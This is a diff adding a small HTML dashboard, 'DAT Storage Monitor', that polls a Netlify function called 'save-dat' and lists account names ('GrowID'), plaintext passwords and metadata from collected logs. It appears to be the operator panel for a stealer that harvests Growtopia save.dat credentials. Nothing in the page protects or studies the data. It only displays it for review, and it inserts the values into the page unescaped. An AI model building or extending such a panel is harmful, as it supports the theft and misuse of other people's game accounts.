@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DAT Monitor | NovaScript</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background: #0f172a; color: #f1f5f9; font-family: 'Inter', sans-serif; }
+        .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.1); }
+    </style>
+</head>
+<body class="p-8">
+    <div class="max-w-6xl mx-auto">
+        <header class="flex justify-between items-center mb-10">
+            <h1 class="text-3xl font-bold bg-gradient-to-r from-blue-400 to-purple-500 bg-clip-text text-transparent">DAT Storage Monitor</h1>
+            <button onclick="fetchData()" class="bg-blue-600 hover:bg-blue-700 px-6 py-2 rounded-lg transition">Refresh Data</button>
+        </header>
+
+        <div id="logsContainer" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+            </div>
+    </div>
+
+    <script>
+        async function fetchData() {
+            const res = await fetch('/.netlify/functions/save-dat');
+            const data = await res.json();
+            const container = document.getElementById('logsContainer');
+            container.innerHTML = data.map(log => `
+                <div class="glass p-6 rounded-xl shadow-2xl">
+                    <div class="flex justify-between mb-4">
+                        <span class="text-xs text-blue-400 font-mono">${log.timestamp}</span>
+                        <span class="bg-green-500/20 text-green-400 text-[10px] px-2 py-1 rounded">ACTIVE</span>
+                    </div>
+                    <div class="space-y-2">
+                        <p class="text-sm"><span class="text-slate-400">GrowID:</span> <span class="font-mono text-white">${log.idName}</span></p>
+                        <p class="text-sm"><span class="text-slate-400">Pass:</span> <span class="font-mono text-purple-400">${log.idPass}</span></p>
+                        <p class="text-sm"><span class="text-slate-400">Meta:</span> <span class="font-mono text-blue-300">${log.meta}</span></p>
+                    </div>
+                </div>
+            `).join('');
+        }
+        fetchData();
+        setInterval(fetchData, 10000); // Auto refresh tiap 10 detik
+    </script>
+</body>
+</html>
